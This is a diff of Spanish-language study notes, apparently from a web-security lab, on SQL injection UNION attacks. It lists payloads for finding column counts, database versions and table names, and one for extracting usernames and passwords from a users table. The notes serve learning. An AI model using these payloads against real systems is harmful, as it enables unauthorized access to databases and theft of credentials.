@@ -24,12 +24,12 @@ USER-- | cuando se tiene un usuario se podria probar la vulnerabilidad tratando 
 
 ## UNION ATTACK
 
-pre-req: numero de columnas y data type de cada columna
+PRE-REQ: numero de columnas y data type de cada columna
 
 ### COMO SABER EL NUMERO DE COLUMNAS ?
 
-metodo_1: ' ORDER BY 1-- \
-metodo_2: ' UNION SELECT NULL--
+METODO_1: ' ORDER BY 1-- \
+METODO_2: ' UNION SELECT NULL--
 
 ### COMO SABER EL DATA TYPE DE UNA COLUMNA ?
 
@@ -49,12 +49,14 @@ MySQL >> SELECT @@version \
 Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance \
 PostgreSQL >> SELECT version() 
 
-### LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft/MySQL/PostgreSQL] 
+### LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft / MySQL / PostgreSQL] 
 
 SELECT [columns] FROM information_schema.tables | '+UNION+SELECT+table_name,null+FROM+information_schema.tables-- \
 SELECT [columns] FROM information_schema.columns 
 
 SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' 
+
+*NOTA: revisar cual es la estructura del "information_schema" por motor.*
 
 ### LISTAR TABLAS DE LA BASE DE DATOS / [Oracle] 
 
@@ -62,6 +64,10 @@ SELECT [columns] FROM all_tables
 
 SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS' 
 
-### MOSTRAR INFORMACION DE OTRAS TABLAS [importante!]
+### MOSTRAR INFORMACION DE OTRAS TABLAS 
 
 ' UNION SELECT username, password FROM users-- | retrieve the username and password from table "users"
+
+
+
+
